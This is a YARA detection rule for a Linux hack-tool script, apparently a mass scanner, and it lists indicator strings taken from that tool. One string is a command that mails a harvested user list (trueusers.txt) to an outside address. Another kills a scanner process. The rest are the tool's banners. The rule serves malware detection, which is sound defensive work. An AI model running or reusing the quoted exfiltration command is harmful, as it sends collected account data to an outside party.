rule LinuxHacktool_eyes_mass
{
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
		os = "linux"
		filetype = "script"

	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii

	condition:
		1 of them
}
